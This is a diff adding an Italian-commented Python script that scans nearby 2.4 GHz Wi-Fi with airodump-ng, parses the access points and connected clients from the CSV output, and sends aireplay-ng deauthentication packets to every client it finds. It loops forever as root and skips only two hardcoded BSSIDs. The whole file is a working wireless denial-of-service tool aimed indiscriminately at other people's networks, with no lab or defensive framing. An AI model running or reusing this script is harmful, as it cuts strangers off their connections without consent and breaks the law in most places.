@@ -1,0 +1,159 @@
+import ZHOR_Modules.nicePrints as np
+import ZHOR_Modules.listUtils as lu
+import ZHOR_Modules.fileManager as fm
+import ZHOR_Modules.listUtils as lu
+import os
+
+
+AP_CSV_HEADER = 'BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power, # beacons, # IV, LAN IP, ID-length, ESSID, Key'
+STA_CSV_HEADER = 'Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs'
+
+DEAUTH_PACKET_NUM = 10
+AIRODUMP_SCAN_SECONDS = 30
+WLAN_CARD = "wlan0"
+np.DEBUG = False
+
+#AP_PATH = "access-points.txt"
+#CL_PATH = "clients.txt"
+CSV_FILE_PATH = "temp2g"
+
+
+
+def airodmupScan():
+    np.debugPrint("Cancello file temporanei ...")
+    os.system("rm {}*".format(CSV_FILE_PATH))
+    com = "timeout {}s ".format(AIRODUMP_SCAN_SECONDS)
+    com += " xterm -T \"Airodump-ng 2.4ghz\" -e \"airodump-ng {} -a -w {}\"".format(WLAN_CARD,CSV_FILE_PATH)
+    np.debugPrint(com)
+
+    np.infoPrint("Eseguo scan per {} secondi".format(str(AIRODUMP_SCAN_SECONDS)))
+    os.system(com)
+
+def deauth(bssid: str, station: str, channel: int,essid: str):
+    com = "iwconfig {} channel {}".format(WLAN_CARD,str(channel))
+    np.debugPrint(com)
+    os.system(com)
+    
+    # aireplay-ng --deauth 0 -a 9C:A2:F4:F8:4D:76 -c 94:65:2D:37:BC:11 wlan0
+
+    com = "aireplay-ng --deauth {} -a {} -c {} {}".format(DEAUTH_PACKET_NUM,bssid,station,WLAN_CARD)
+    np.debugPrint(com)
+    os.system(com)
+
+
+# prende una riga e restituisce una lista formattata per determinare i valori
+def parseLine(line: str):        
+    values = line.replace('   ',' ').replace('  ',' ').replace('\t','').replace(', ',',').strip().split(',')
+
+    #lu.fancyPrint(values)
+    #input()
+
+    return values
+
+# restituisce una dizionario le cui chiavi sono il BSSID e il valore è una tupla del tipo (canale, essid)
+def parseAPinfo():
+    lines = fm.fileToSimpleList(CSV_FILE_PATH + "-01.csv")
+
+    # gli ap stanno tra l'index 2 e <dove sta la scritta degli STA -2>
+    AP_linesIndex = 0
+    for line in lines:
+        if STA_CSV_HEADER in line:
+            break
+        else:
+            AP_linesIndex += 1
+
+    AP_lines = lines[2:AP_linesIndex - 1]
+
+
+
+    outputDict = {}
+    for l in AP_lines:
+        values = parseLine(l)
+        
+        bssid = values[0]
+        channel = values[3]
+        essid = values[13]
+
+        outputDict[bssid] = (channel,essid)
+
+    return outputDict
+
+# restituisce un dizionario le cui chiavi sono il macSTA e il valore è il BSSID
+def parseCLinfo():
+    lines = fm.fileToSimpleList(CSV_FILE_PATH + "-01.csv")
+
+    # gli ap stanno tra l'index <dove sta la scritta degli STA -1> e la "fine -1 ""
+    STA_linesIndex = 0
+    for line in lines:
+        if STA_CSV_HEADER in line:
+            break # trovato
+        else:
+            STA_linesIndex += 1
+
+
+
+    STA_lines = lines[STA_linesIndex + 1:-1]
+
+    #lu.fancyPrint(STA_lines)
+    #input()
+
+
+    outputDict = {}
+    for l in STA_lines:
+
+        if '(not associated)' in l:
+            pass
+        else:
+            values = parseLine(l)        
+            bssid = values[5]
+            station = values[0]
+            outputDict[station] = bssid
+
+    return outputDict
+
+
+
+if __name__ == '__main__':
+
+    # controlla se sei root
+    if os.geteuid() != 0:
+        np.errorPrint("User is not root. Please execute this script as root or with sudo")
+        exit()
+
+
+
+
+    while True:
+        airodmupScan()
+
+        ap_info = parseAPinfo()    
+        cl_info = parseCLinfo()
+        
+        print(ap_info)
+        print(cl_info)
+
+
+        if cl_info == {}:
+            np.infoPrint("Nessun client connesso trovato. Vado avanti.")
+        else:
+
+            # deauth su ogni client trovato
+            for clientMac in cl_info:
+
+                try: 
+
+                    
+                    apMac = cl_info[clientMac]
+                    channel = ap_info[apMac][0]
+                    essid = ap_info[apMac][1]
+
+
+                    if '00:C0:CA:AF:6D:D5' in apMac or '00:C0:CA:98:BF:91' in apMac:
+                        pass
+                    else:
+                        np.infoPrint("[SSID: {}] [AP: {}] [STA: {}] [CH: {}]".format(essid,apMac,clientMac,channel))
+                        deauth(apMac,clientMac,channel,essid)
+
+                except:
+                    #np.errorPrint("[SSID: {}] [AP: {}] [STA: {}] [CH: {}] il client non è connesso al BSSID specificato (si può essere scollegato o aver cambiato BSSID)".format(essid,apMac,clientMac,channel))
+                    np.errorPrint("apMac: {} clMac: {}".format(apMac,clientMac))
